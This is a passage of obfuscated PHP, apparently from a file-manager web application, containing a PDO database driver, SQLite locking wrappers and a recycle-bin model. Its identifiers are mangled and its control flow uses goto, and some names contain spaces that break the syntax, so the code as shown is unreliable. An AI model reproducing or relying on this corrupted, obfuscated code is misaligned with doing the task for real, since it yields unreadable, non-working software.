PDO($fã–ÕíÍ£‡[$FÀòğÀµéã[851]], $fã–ÕíÍ£‡[$FÀòğÀµéã[824]], $fã–ÕíÍ£‡[$FÀòğÀµéã[825]], $fã–ÕíÍ£‡[$FÀòğÀµéã[13]]); } catch (PDOException $C ßÂã‘Ää) { think_exception($C ßÂã‘Ää->getMessage()); } $this->dbType = $this->_getDsnType($fã–ÕíÍ£‡[$FÀòğÀµéã[851]]); if (in_array($this->dbType, array($FÀòğÀµéã[852], $FÀòğÀµéã[853], $FÀòğÀµéã[854], $FÀòğÀµéã[855]))) { think_exception($FÀòğÀµéã[856] . $this->dbType . $FÀòğÀµéã[857] . $this->dbType . $FÀòğÀµéã[858]); } goto BÁÆâ±½„; BÁÆâ±½„: if (!$this->linkID[$A´º¶‡·¢]) { think_exception($FÀòğÀµéã[859]); } try { $this->linkID[$A´º¶‡·¢]->exec($FÀòğÀµéã[860] . think_config($FÀòğÀµéã[827])); } catch (Exception $C ßÂã‘Ää) { } $this->connected = !0; goto FóÜö§†…ø; B›‚“¶ÊÖí: if (empty($fã–ÕíÍ£‡)) { $fã–ÕíÍ£‡ = $this->config; } $cã¨¼Œ’‹ù = !empty($fã–ÕíÍ£‡[$FÀòğÀµéã[13]][$FÀòğÀµéã[14]]) ? $fã–ÕíÍ£‡[$FÀòğÀµéã[13]][$FÀòğÀµéã[14]] : $this->pconnect; if ($cã¨¼Œ’‹ù) { $fã–ÕíÍ£‡[$FÀòğÀµéã[13]][PDO::ATTR_PERSISTENT] = !0; } goto fÏ°«í°Óæ; FóÜö§†…ø: if (1 != think_config($FÀòğÀµéã[18])) { unset($this->config); } goto A’õ¬ôÏôˆ; A’õ¬ôÏôˆ: } return $this->linkID[$A´º¶‡·¢]; } public function free() { $this->PDOStatement = null; } public function query($f¥ˆ—šœ£¨, $d’ĞæÀÊ´ñ = array()) { goto eğ—Œ±Ìëö; Fœ¤ëÖ¼¬å: $this->queryStr = $f¥ˆ—šœ£¨; if (!empty($d’ĞæÀÊ´ñ)) { $this->queryStr .= $A‚ñÆë³±[861] . print_r($d’ĞæÀÊ´ñ, !0) . $A‚ñÆë³±[862]; } if (!empty($this->PDOStatement)) { $this->free(); } goto FÔ³£—¬ö¨; FÖªÅ‡İ£ª: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $BÍÓº©êë = $this->PDOStatement->execute($d’ĞæÀÊ´ñ); $this->debug(); goto eêÕåùĞŸ·; FÔ³£—¬ö¨: think_action_status($A‚ñÆë³±[19], 1); think_status($A‚ñÆë³±[20]); $this->PDOStatement = $this->_linkID->prepare($f¥ˆ—šœ£¨); goto FÖªÅ‡İ£ª; eğ—Œ±Ìëö: $A‚ñÆë³± =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Fœ¤ëÖ¼¬å; eêÕåùĞŸ·: if (!1 === $BÍÓº©êë) { $this->error(); return !1; } else { return $this->getAll(); } goto B¼é¹­íÁ; B¼é¹­íÁ: } public function execute($d²Ã˜ë¼ø, $FÃÑ¥‹²å = array()) { goto d¡ ğğàÛí; d‡¤ÄÎ¡à†: $Cƒƒ‰¥ˆìœ = $this->PDOStatement->execute($FÃÑ¥‹²å); $this->debug(); if (!1 === $Cƒƒ‰¥ˆìœ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($b·µƒÉˆë‘ || preg_match($CçŞåœ‚Õ»[867], $d²Ã˜ë¼ø)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto f»èéŠÒŒŠ; E ôŠ‚´÷À: if ($this->dbType == $CçŞåœ‚Õ»[855]) { if (preg_match($CçŞåœ‚Õ»[863], $this->queryStr, $cßÖ¨ˆ¾©¿)) { $this->table = think_config($CçŞåœ‚Õ»[864]) . str_ireplace(think_config($CçŞåœ‚Õ»[865]), $CçŞåœ‚Õ»[373], $cßÖ¨ˆ¾©¿[2]); $b·µƒÉˆë‘ = (bool) $this->query($CçŞåœ‚Õ»[866] . strtoupper($this->table) . $CçŞåœ‚Õ»[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($CçŞåœ‚Õ»[21], 1); goto b³ÒÂ’£á; b³ÒÂ’£á: think_status($CçŞåœ‚Õ»[20]); $this->PDOStatement = $this->_linkID->prepare($d²Ã˜ë¼ø); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto d‡¤ÄÎ¡à†; fù˜»Œ›ùŞ: $this->queryStr = $d²Ã˜ë¼ø; if (!empty($FÃÑ¥‹²å)) { $this->queryStr .= $CçŞåœ‚Õ»[861] . print_r($FÃÑ¥‹²å, !0) . $CçŞåœ‚Õ»[862]; } $b·µƒÉˆë‘ = !1; goto E ôŠ‚´÷À; d¡ ğğàÛí: $CçŞåœ‚Õ» =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fù˜»Œ›ùŞ; f»èéŠÒŒŠ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bí¬ï›Ÿù = $this->_linkID->commit(); $this->transTimes = 0; if (!$Bí¬ï›Ÿù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D˜¶Î¹Ú¡± = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D˜¶Î¹Ú¡±) { $this->error(); return !1; } } return !0; } private function getAll() { $C…Ç»ê¼¾  = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($C…Ç»ê¼¾ ); return $C…Ç»ê¼¾ ; } public function getFields($DÁÌñˆ²¾¤) { goto f“²ííØİ; f“²ííØİ: $D¹´¦‹ĞÕš =& $_SERVER[¹Ò‹Ò¹]; $this->initConnect(!0); if (think_config($D¹´¦‹ĞÕš[868])) { $B†Å±ƒÓù¢ = str_replace($D¹´¦‹ĞÕš[869], $DÁÌñˆ²¾¤, think_config($D¹´¦‹ĞÕš[868])); } else { switch ($this->dbType) { case $D¹´¦‹ĞÕš[852]: case $D¹´¦‹ĞÕš[870]: $B†Å±ƒÓù¢ = "\123\x45\x4c\105\x43\124\40\40\40\143\157\x6c\165\x6d\156\137\156\141\x6d\x65\40\141\163\x20\x27\116\141\155\x65\x27\x2c\x20\x20\x20\144\141\x74\x61\x5f\x74\171\x70\x65\40\141\163\40\x27\124\x79\x70\145\x27\x2c\x20\x20\x20\143\x6f\154\165\x6d\x6e\x5f\144\145\x66\x61\x75\154\x74\x20\141\163\40\47\x44\145\x66\x61\x75\154\x74\x27\x2c\x20\x20\x20\x69\x73\137\x6e\165\x6c\154\x61\142\154\x65\x20\141\x73\40\x27\116\x75\154\154\47\xa\11\11\x46\x52\x4f\x4d\11\151\156\146\x6f\x72\155\141\164\151\x6f\156\x5f\163\x63\150\145\155\141\56\164\x61\142\x6c\x65\163\40\x41\x53\40\x74\xa\x9\x9\112\117\111\116\x9\151\x6e\x66\x6f\x72\155\141\x74\x69\157\156\137\x73\143\150\145\155\141\x2e\x63\x6f\154\x75\x6d\156\163\x20\x41\123\40\x63\12\x9\x9\117\x4e\40\40\x74\x2e\164\141\x62\x6c\145\x5f\x63\141\164\x61\154\157\147\40\x3d\x20\143\56\164\141\142\x6c\x65\137\143\x61\x74\x61\154\x6f\147\xa\x9\11\101\x4e\104\x20\164\x2e\164\141\x62\x6c\145\x5f\163\x63\x68\x65\x6d\141\40\75\x20\x63\x2e\x74\x61\142\x6c\145\137\163\143\x68\145\155\141\xa\11\x9\101\116\x44\x20\164\56\x74\141\x62\154\145\x5f\156\x61\155\145\x20\75\x20\x63\x2e\x74\141\x62\154\145\137\156\x61\x6d\145\xa\x9\11\x57\x48\x45\x52\x45\40\40\40\x74\x2e\164\x61\142\x6c\x65\x5f\x6e\x61\x6d\x65\x20\x3d\x20\x27{$DÁÌñˆ²¾¤}\47"; break; case $D¹´¦‹ĞÕš[871]: $B†Å±ƒÓù¢ = $D¹´¦‹ĞÕš[872] . $DÁÌñˆ²¾¤ . $D¹´¦‹ĞÕš[873]; break; case $D¹´¦‹ĞÕš[853]: case $D¹´¦‹ĞÕš[855]: $B†Å±ƒÓù¢ = $D¹´¦‹ĞÕš[874] . $D¹´¦‹ĞÕš[875] . $D¹´¦‹ĞÕš[876] . strtoupper($DÁÌñˆ²¾¤) . $D¹´¦‹ĞÕš[877] . strtoupper($DÁÌñˆ²¾¤) . $D¹´¦‹ĞÕš[878]; break; case $D¹´¦‹ĞÕš[879]: $B†Å±ƒÓù¢ = $D¹´¦‹ĞÕš[880] . $DÁÌñˆ²¾¤ . $D¹´¦‹ĞÕš[881]; break; case $D¹´¦‹ĞÕš[854]: break; case $D¹´¦‹ĞÕš[882]: default: $B†Å±ƒÓù¢ = $D¹´¦‹ĞÕš[883] . ($this->dbType == $D¹´¦‹ĞÕš[882] ? "\x60{$DÁÌñˆ²¾¤}\x60" : $DÁÌñˆ²¾¤); } } goto EÚÓ¹†œ«Ù; EÚÓ¹†œ«Ù: $bµÚµ±Ğœ = $this->query($B†Å±ƒÓù¢); $Fß»‰äÊ®İ = array(); if ($bµÚµ±Ğœ) { foreach ($bµÚµ±Ğœ as $D±¡…÷—‰ => $B äçËÓÔŒ) { $B äçËÓÔŒ = array_change_key_case($B äçËÓÔŒ); $B äçËÓÔŒ[$D¹´¦‹ĞÕš[28]] = isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[28]]) ? $B äçËÓÔŒ[$D¹´¦‹ĞÕš[28]] : $D¹´¦‹ĞÕš[373]; $B äçËÓÔŒ[$D¹´¦‹ĞÕš[29]] = isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[29]]) ? $B äçËÓÔŒ[$D¹´¦‹ĞÕš[29]] : $D¹´¦‹ĞÕš[373]; $E¯¦äßÌˆ· = isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[269]]) ? $B äçËÓÔŒ[$D¹´¦‹ĞÕš[269]] : $B äçËÓÔŒ[$D¹´¦‹ĞÕš[28]]; $Fß»‰äÊ®İ[$E¯¦äßÌˆ·] = array($D¹´¦‹ĞÕš[28] => $E¯¦äßÌˆ·, $D¹´¦‹ĞÕš[29] => $B äçËÓÔŒ[$D¹´¦‹ĞÕš[29]], $D¹´¦‹ĞÕš[31] => (bool) (isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[102]]) && $B äçËÓÔŒ[$D¹´¦‹ĞÕš[102]] === $D¹´¦‹ĞÕš[33] || isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[31]]) && $B äçËÓÔŒ[$D¹´¦‹ĞÕš[31]] === $D¹´¦‹ĞÕš[33]), $D¹´¦‹ĞÕš[34] => isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[34]]) ? $B äçËÓÔŒ[$D¹´¦‹ĞÕš[34]] : (isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[53]]) ? $B äçËÓÔŒ[$D¹´¦‹ĞÕš[53]] : $D¹´¦‹ĞÕš[373]), $D¹´¦‹ĞÕš[36] => isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[92]]) ? strtolower($B äçËÓÔŒ[$D¹´¦‹ĞÕš[92]]) == $D¹´¦‹ĞÕš[38] : (isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[54]]) ? $B äçËÓÔŒ[$D¹´¦‹ĞÕš[54]] : !1), $D¹´¦‹ĞÕš[39] => isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[884]]) ? strtolower($B äçËÓÔŒ[$D¹´¦‹ĞÕš[884]]) == $D¹´¦‹ĞÕš[41] : (isset($B äçËÓÔŒ[$D¹´¦‹ĞÕš[92]]) ? $B äçËÓÔŒ[$D¹´¦‹ĞÕš[92]] : !1)); } } goto aåÒå±…å; aåÒå±…å: return $Fß»‰äÊ®İ; goto Eç°É¼¢õ‚; Eç°É¼¢õ‚: } public function getTables($C°…”¬È‡˜ = '') { $DÉğ‹î³Ó³ =& $_SERVER[¹Ò‹Ò¹]; if (think_config($DÉğ‹î³Ó³[885])) { $fÉŠŒÆËÁ› = str_replace($DÉğ‹î³Ó³[886], $C°…”¬È‡˜, think_config($DÉğ‹î³Ó³[885])); } else { switch ($this->dbType) { case $DÉğ‹î³Ó³[853]: case $DÉğ‹î³Ó³[855]: $fÉŠŒÆËÁ› = $DÉğ‹î³Ó³[887]; break; case $DÉğ‹î³Ó³[852]: case $DÉğ‹î³Ó³[870]: $fÉŠŒÆËÁ› = $DÉğ‹î³Ó³[888]; break; case $DÉğ‹î³Ó³[879]: $fÉŠŒÆËÁ› = $DÉğ‹î³Ó³[889]; break; case $DÉğ‹î³Ó³[854]: think_exception(think_lang($DÉğ‹î³Ó³[890]) . $DÉğ‹î³Ó³[891]); break; case $DÉğ‹î³Ó³[871]: $fÉŠŒÆËÁ› = $DÉğ‹î³Ó³[42] . $DÉğ‹î³Ó³[43] . $DÉğ‹î³Ó³[44]; break; case $DÉğ‹î³Ó³[882]: default: if (!empty($C°…”¬È‡˜)) { $fÉŠŒÆËÁ› = $DÉğ‹î³Ó³[835] . $C°…”¬È‡˜ . $DÉğ‹î³Ó³[836]; } else { $fÉŠŒÆËÁ› = $DÉğ‹î³Ó³[837]; } } } $b•³ÈõÅ² = $this->query($fÉŠŒÆËÁ›); $E²œ—¶…Ì = array(); foreach ($b•³ÈõÅ² as $F³…¹¤× · => $a‰Ş™¡Ã’) { $E²œ—¶…Ì[$F³…¹¤× ·] = current($a‰Ş™¡Ã’); } return $E²œ—¶…Ì; } protected function parseLimit($DÂÉºêÃŸš) { $eÅÃ©åÜ° =& $_SERVER[¹Ò‹Ò¹]; $d®×æĞ’óğ = $eÅÃ©åÜ°[33]; if (!empty($DÂÉºêÃŸš)) { switch ($this->dbType) { case $eÅÃ©åÜ°[879]: case $eÅÃ©åÜ°[871]: $DÂÉºêÃŸš = explode($eÅÃ©åÜ°[47], $DÂÉºêÃŸš); if (count($DÂÉºêÃŸš) > 1) { $d®×æĞ’óğ .= $eÅÃ©åÜ°[48] . $DÂÉºêÃŸš[1] . $eÅÃ©åÜ°[49] . $DÂÉºêÃŸš[0] . $eÅÃ©åÜ°[50]; } else { $d®×æĞ’óğ .= $eÅÃ©åÜ°[48] . $DÂÉºêÃŸš[0] . $eÅÃ©åÜ°[50]; } break; case $eÅÃ©åÜ°[852]: case $eÅÃ©åÜ°[870]: break; case $eÅÃ©åÜ°[854]: break; case $eÅÃ©åÜ°[853]: case $eÅÃ©åÜ°[855]: break; case $eÅÃ©åÜ°[882]: default: $d®×æĞ’óğ .= $eÅÃ©åÜ°[48] . $DÂÉºêÃŸš . $eÅÃ©åÜ°[50]; } } return $d®×æĞ’óğ; } public function parseKey(&$bî´áâãÓ‡, $Eƒ‘–“©ÕÄ = true) { $EĞƒïÉ¢ö¢ =& $_SERVER[¹Ò‹Ò¹]; if ($Eƒ‘–“©ÕÄ) { $bî´áâãÓ‡ = $this->parseKeyCheck($bî´áâãÓ‡); } if ($this->dbType == $EĞƒïÉ¢ö¢[882]) { if ($bî´áâãÓ‡ != $EĞƒïÉ¢ö¢[181] && !preg_match($EĞƒïÉ¢ö¢[847], $bî´áâãÓ‡)) { $bî´áâãÓ‡ = $EĞƒïÉ¢ö¢[380] . trim($bî´áâãÓ‡, $EĞƒïÉ¢ö¢[380]) . $EĞƒïÉ¢ö¢[380]; } return $bî´áâãÓ‡; } else { return parent::parseKey($bî´áâãÓ‡, $Eƒ‘–“©ÕÄ); } } public function close() { $this->_linkID = null; } public function error() { $c—¶Ã¤®®Ü =& $_SERVER[¹Ò‹Ò¹]; if ($this->PDOStatement) { $FÈŸ—ê¢¦ = $this->PDOStatement->errorInfo(); $this->error = $FÈŸ—ê¢¦[1] . $c—¶Ã¤®®Ü[4] . $FÈŸ—ê¢¦[2]; } else { $this->error = $c—¶Ã¤®®Ü[33]; } if ($c—¶Ã¤®®Ü[33] != $this->queryStr) { $this->error .= LNG($c—¶Ã¤®®Ü[45]) . $this->queryStr; } think_trace($this->error, $c—¶Ã¤®®Ü[33], $c—¶Ã¤®®Ü[46]); return $this->error; } public function escapeString($fö½¶Œ£ç) { $Fø¨­”êªà =& $_SERVER[¹Ò‹Ò¹]; switch ($this->dbType) { case $Fø¨­”êªà[879]: case $Fø¨­”êªà[852]: case $Fø¨­”êªà[870]: case $Fø¨­”êªà[882]: return addslashes($fö½¶Œ£ç); case $Fø¨­”êªà[854]: case $Fø¨­”êªà[871]: case $Fø¨­”êªà[853]: case $Fø¨­”êªà[855]: return str_ireplace($Fø¨­”êªà[55], $Fø¨­”êªà[56], $fö½¶Œ£ç); } } protected function parseValue($E­­„²â‡) { $fËï¡­©–† =& $_SERVER[¹Ò‹Ò¹]; if (is_string($E­­„²â‡)) { $dêŸ•™÷×’ = strpos($E­­„²â‡, $fËï¡­©–†[4]) === 0 && in_array($E­­„²â‡, array_keys($this->bind)); $E­­„²â‡ = $dêŸ•™÷×’ ? $this->escapeString($E­­„²â‡) : $fËï¡­©–†[892] . $this->escapeString($E­­„²â‡) . $fËï¡­©–†[892]; } elseif (isset($E­­„²â‡[0]) && is_string($E­­„²â‡[0]) && strtolower($E­­„²â‡[0]) == $fËï¡­©–†[293]) { $E­­„²â‡ = $this->escapeString($E­­„²â‡[1]); } elseif (is_array($E­­„²â‡)) { $E­­„²â‡ = array_map(array($this, $fËï¡­©–†[893]), $E­­„²â‡); } elseif (is_bool($E­­„²â‡)) { $E­­„²â‡ = $E­­„²â‡ ? $fËï¡­©–†[86] : $fËï¡­©–†[491]; } elseif (is_null($E­­„²â‡)) { $E­­„²â‡ = $fËï¡­©–†[102]; } return $E­­„²â‡; } public function getLastInsertId() { $bÛÔä½¬Å¤ =& $_SERVER[¹Ò‹Ò¹]; switch ($this->dbType) { case $bÛÔä½¬Å¤[879]: case $bÛÔä½¬Å¤[871]: case $bÛÔä½¬Å¤[852]: case $bÛÔä½¬Å¤[870]: case $bÛÔä½¬Å¤[854]: case $bÛÔä½¬Å¤[882]: return $this->_linkID->lastInsertId(); case $bÛÔä½¬Å¤[853]: case $bÛÔä½¬Å¤[855]: $b˜¥œº‰‰™ = $this->table; $BÖ”ˆ¡´· = $this->query("\x53\x45\114\105\103\124\x20{$b˜¥œº‰‰™}\56\143\165\162\x72\x76\x61\154\x20\143\165\x72\x72\x76\x61\x6c\x20\x46\x52\117\x4d\40\144\x75\x61\154"); return $BÖ”ˆ¡´· ? $BÖ”ˆ¡´·[0][$bÛÔä½¬Å¤[894]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($CÍ”¿İï°”) { $dæ‡Ğç¼Á =& $_SERVER[¹Ò‹Ò¹]; if (!CacheLock::fileLock($dæ‡Ğç¼Á[9])) { return !1; } $cÆĞç¸‹˜» = parent::query($CÍ”¿İï°”); CacheLock::fileUnLock($dæ‡Ğç¼Á[9]); return $cÆĞç¸‹˜»; } public function execute($a‚ó¬Ç‰ŠŠ) { $d˜ôÕùÙ =& $_SERVER[¹Ò‹Ò¹]; if (!CacheLock::fileLock($d˜ôÕùÙ[9])) { return !1; } $eÚƒ¯‘Ô×ö = parent::execute($a‚ó¬Ç‰ŠŠ); CacheLock::fileUnLock($d˜ôÕùÙ[9]); return $eÚƒ¯‘Ô×ö; } } class DbSqlite3 extends DbSqlite3Base { public function query($d¥õáÁ¾’½) { $fï…Şğë‘ä =& $_SERVER[¹Ò‹Ò¹]; if (!CacheLock::fileLock($fï…Şğë‘ä[9])) { return !1; } $fß®¶à«î‹ = parent::query($d¥õáÁ¾’½); CacheLock::fileUnLock($fï…Şğë‘ä[9]); return $fß®¶à«î‹; } public function execute($f¯—×éÕô¢) { $aÛå©‚ñåè =& $_SERVER[¹Ò‹Ò¹]; if (!CacheLock::fileLock($aÛå©‚ñåè[9])) { return !1; } $Eš°‡ÈêáŒ = parent::execute($f¯—×éÕô¢); CacheLock::fileUnLock($aÛå©‚ñåè[9]); return $Eš°‡ÈêáŒ; } } goto bŸ¹ĞÀÛè; bÕÕ’œ†á³: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\143\145\x5f\x72\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\155\x65", "\164\151\x6d\145", "\151\156\163\x65\162\x74", "\146\165\156\x63\x74\151\x6f\x6e")); public function listData($d¦å÷‘ = false) { $FóÆ‰‘²Õ =& $_SERVER[¹Ò‹Ò¹]; $d¦å÷‘ = $d¦å÷‘ ? $d¦å÷‘ : USER_ID; $D½Å—ŒÎ´ = $this->where(array($FóÆ‰‘²Õ[1496] => $d¦å÷‘))->select(); return array_to_keyvalue($D½Å—ŒÎ´, $FóÆ‰‘²Õ[33], $FóÆ‰‘²Õ[390]); } public function moveToRecycle($A„Ïìº¡Í±) { goto A•ë¶Ş²ªÓ; aÄ«Áçíõ¿: $this->recycleMove($A„Ïìº¡Í±, 1); if ($A½Š”Š÷…[$Dˆ‹–™”˜[397]] == $Dˆ‹–™”˜[86]) { $B—Ù£©õ§¢ = array($Dˆ‹–™”˜[548] => array($Dˆ‹–™”˜[507], $A½Š”Š÷…[$Dˆ‹–™”˜[481]] . $A„Ïìº¡Í± . $Dˆ‹–™”˜[508])); $dËÎ„²Øõ±->where($B—Ù£©õ§¢)->setField($Dˆ‹–™”˜[417], 1); } goto EÔ‚¨½ß; A•ë¶Ş²ªÓ: $Dˆ‹–™”˜ =& $_SERVER[¹Ò‹Ò¹]; $dËÎ„²Øõ± = Model($Dˆ‹–™”˜[1179]); $A½Š”Š÷… = $dËÎ„²Øõ±->sourceInfo($A„Ïìº¡Í±); goto fˆ®¢… ›Æ; fˆ®¢… ›Æ: if (!$A½Š”Š÷… || $A½Š”Š÷…[$Dˆ‹–™”˜[417]] == $Dˆ‹–™”˜[86]) { return; } $B‚ô¨„¶Õö = array($Dˆ‹–™”˜[404] => $A„Ïìº¡Í±, $Dˆ‹–™”˜[1496] => USER_ID, $Dˆ‹–™”˜[544] => $A½Š”Š÷…[$Dˆ‹–™”˜[398]], $Dˆ‹–™”˜[545] => $A½Š”Š÷…[$Dˆ‹–™”˜[478]], $Dˆ‹–™”˜[548] => $A½Š”Š÷…[$Dˆ‹–™”˜[481]]); $this->add($B‚ô¨„¶Õö); goto aÄ«Áçíõ¿; EÔ‚¨½ß: } public function clear() { $this->remove(!1); } public function remove($f›ãÊ•´­ = false) { goto DÂ¥¸„ˆ©î; D›½ÇÀˆ‹½: foreach ($dšÛòƒ¼¹ as $fÏäŸš¥ï›) { $Eš…¤­…»->targetSpaceUpdate($fÏäŸš¥ï›[$EÛ¾É³œõ[398]], $fÏäŸš¥ï›[$EÛ¾É³œõ[478]]); } goto eÇÌ‘ÅÔİÇ; F„†ˆ”ÃÊÒ: $f›ãÊ•´­ = $f›ãÊ•´­ === !1 ? !1 : $f›ãÊ•´­; $dšÛòƒ¼¹ = array(); foreach ($d¨‰…“çÑ‹ as $cÆù‡¶ò) { if ($f›ãÊ•´­ != !1 && !in_array($cÆù‡¶ò, $f›ãÊ•´­)) { continue; } $f …¶‚‘½ç = $Eš…¤­…»->sourceInfo($cÆù‡¶ò); $Eš…¤­…»->remove($cÆù‡¶ò, !1); $c£®ò•Ø²Ã = $f …¶‚‘½ç[$EÛ¾É³œõ[398]] . $EÛ¾É³œõ[70] . $f …¶‚‘½ç[$EÛ¾É³œõ[478]]; $dšÛòƒ¼¹[$c£®ò•Ø²Ã] = array($EÛ¾É³œõ[544] => $f …¶‚‘½ç[$EÛ¾É³œõ[398]], $EÛ¾É³œõ[478] => $f …¶‚‘½ç[$EÛ¾É³œõ[478]]); $this->where(array($EÛ¾É³œõ[390] => $cÆù‡¶ò))->delete(); } goto D›½ÇÀˆ‹½; DÂ¥¸„ˆ©î: $EÛ¾É³œõ =& $_SERVER[¹Ò‹Ò¹]; $Eš…¤­…» = Model($EÛ¾É³œõ[1179]); $d¨‰…“çÑ‹ = $this->listData(); goto F„†ˆ”ÃÊÒ; eÇÌ‘ÅÔİÇ: } public function restore($A™¡ÈÁŞ¼Õ = false) { $D›½÷é›£˜ = $this->listData(); $this->_restoreSource($D›½÷é›£˜, $A™¡ÈÁŞ¼Õ); } public function restoreUserAll($a ö­¹‡ª) { $e³ß“ƒõÁâ = $this->listData($a ö­¹‡ª); $this->_restoreSource($e³ß“ƒõÁâ, !1); } private function _restoreSource($e‰«­‰™ïË, $E®óï’ğ¶) { goto d•óÂÑœ‰—; c´Ëè†…™’: if (!$e‰«­‰™ïË) { return !0; } $e¦š×’»İÒ = array(); foreach ($e‰«­‰™ïË as $a…‰¯¢ßÁŒ) { goto c³‘´™ò¢; f˜Ä¨†¹ˆ: $e¦š×’»İÒ[] = $bã«ˆªÈ[$c’±ßÌŞ¾‰[472]]; if ($bã«ˆªÈ[$c’±ßÌŞ¾‰[397]] == $c’±ßÌŞ¾‰[86]) { $e¦š×’»İÒ[] = $a…‰¯¢ßÁŒ; } $Aé’×ùÓ‚§->lockMoveEnd($a…‰¯¢ßÁŒ); goto E¸ÃÌ–ÃÏÚ; c³‘´™ò¢: if ($E®óï’ğ¶ != !1 && !in_array($a…‰¯¢ßÁŒ, $E®óï’ğ¶)) { continue; } $bã«ˆªÈ = $Aé’×ùÓ‚§->sourceInfo($a…‰¯¢ßÁŒ); $d÷Ù“¡Ë™– = $Aé’×ùÓ‚§->sourceInfo($bã«ˆªÈ[$c’±ßÌŞ¾‰[472]]); goto D•ºÜÇæµŒ; D•ºÜÇæµŒ: if ($d÷Ù“¡Ë™–[$c’±ßÌŞ¾‰[417]] == $c’±ßÌŞ¾‰[86]) { continue; } $Aé’×ùÓ‚§->lockMoveStart($a…‰¯¢ßÁŒ); $this->recycleMove($a…‰¯¢ßÁŒ, 0); goto cğÛ†öÎø; cğÛ†öÎø: if ($bã«ˆªÈ[$c’±ßÌŞ¾‰[397]] == $c’±ßÌŞ¾‰[86]) { $e†·ÁÜ…¤‰ = array($c’±ßÌŞ¾‰[548] => array($c’±ßÌŞ¾‰[507], $bã«ˆªÈ[$c’±ßÌŞ¾‰[481]] . $a…‰¯¢ßÁŒ . $c’±ßÌŞ¾‰[508])); $Aé’×ùÓ‚§->where($e†·ÁÜ…¤‰)->setField($c’±ßÌŞ¾‰[417], 0); $this->restoreFolderChildren($a…‰¯¢ßÁŒ, $e‰«­‰™ïË); } $this->where(array($c’±ßÌŞ¾‰[390] => $a…‰¯¢ßÁŒ))->delete(); $Aé’×ùÓ‚§->folderSizeReset($bã«ˆªÈ[$c’±ßÌŞ¾‰[472]]); goto f˜Ä¨†¹ˆ; E¸ÃÌ–ÃÏÚ: } goto d¹õ›“Û­Ñ; d•óÂÑœ‰—: $c’±ßÌŞ¾‰ =& $_SERVER[¹Ò‹Ò¹]; $Aé’×ùÓ‚§ = Model($c’±ßÌŞ¾‰[1179]); $E®óï’ğ¶ = $E®óï’ğ¶ == !1 ? !1 : $E®óï’ğ¶; goto c´Ëè†…™’; d¹õ›“Û­Ñ: $Aé’×ùÓ‚§->updateModifyTime($e¦š×’»İÒ); goto B¾õã ¸í©; B¾õã ¸í©: } private function restoreFolderChildren($fåôÁ‡³ñë, $Aç™¥åé‚) { goto e—Œâˆ–Òî; e—Œâˆ–Òî: $cí”„“‚¡á =& $_SERVER[¹Ò‹Ò¹]; $CŸïÓ‰÷£¼ = Model($cí”„“‚¡á[1179]); $Cí­Éîôª = array($cí”„“‚¡á[390] => array($cí”„“‚¡á[7], array())); goto dÀ³´ÕÀø; dÀ³´ÕÀø: foreach ($Aç™¥åé‚ as $E¶ÄÉÕ‘Ë) { if ($E¶ÄÉÕ‘Ë == $fåôÁ‡³ñë) { continue; } if (!$CŸïÓ‰÷£¼->isParentOf($fåôÁ‡³ñë, $E¶ÄÉÕ‘Ë)) { continue; } $CœÏ„ÏÍÅ = $CŸïÓ‰÷£¼->sourceInfo($E¶ÄÉÕ‘Ë); if ($CœÏ„ÏÍÅ[$cí”„“‚¡á[397]] == $cí”„“‚¡á[86]) { $Cí­Éîôª[] = array($cí”„“‚¡á[548] => array($cí”„“‚¡á[507], $CœÏ„ÏÍÅ[$cí”„“‚¡á[481]] . $E¶ÄÉÕ‘Ë . $cí”„“‚¡á[508])); } else { $Cí­Éîôª[$cí”„“‚¡á[390]][1][] = $E¶ÄÉÕ‘Ë; } } if (!$Cí­Éîôª[$cí”„“‚¡á[390]][1]) { unset($Cí­Éîôª[$cí”„“‚¡á[390]]); } if (!$Cí­Éîôª) { return; } goto d£ØÉí®ƒ–; d£ØÉí®ƒ–: $Cí­Éîôª[$cí”„“‚¡á[390]][1] = array_unique($Cí­Éîôª[$cí”„“‚¡á[390]][1]); $Cí­Éîôª[$cí”„“‚¡á[933]] = $cí”„“‚¡á[1756]; $CŸïÓ‰÷£¼->where($Cí­Éîôª)->setField($cí”„“‚¡á[417], 1); goto bğ‡¶ÎÜåİ; bğ‡¶ÎÜåİ: } private function recycleMove($dÅœ­³î§, $d­®­¡×¸Ã = 1) { $EÙ‘±Š‰± =& $_SERVER[¹Ò‹Ò¹]; $D™ÎÌô‚†å = Model($EÙ‘±Š‰±[1179]); $dóÕÆ®ôˆ = Model($EÙ‘±Š‰±[1965]); $AµŞÓ¼¶À = array($EÙ‘±Š‰±[390] => $dÅœ­³î§); if ($d­®­¡×¸Ã) { $D™ÎÌô‚†å->where($AµŞÓ¼¶À)->setField($EÙ‘±Š‰±[417], 1); $dóÕÆ®ôˆ->eventRecycle($dÅœ­³î§, $EÙ‘±Š‰±[1966]); } else { $f²¿ÜÊÏÑ = $D™ÎÌô‚†å->where($AµŞÓ¼¶À)->find(); 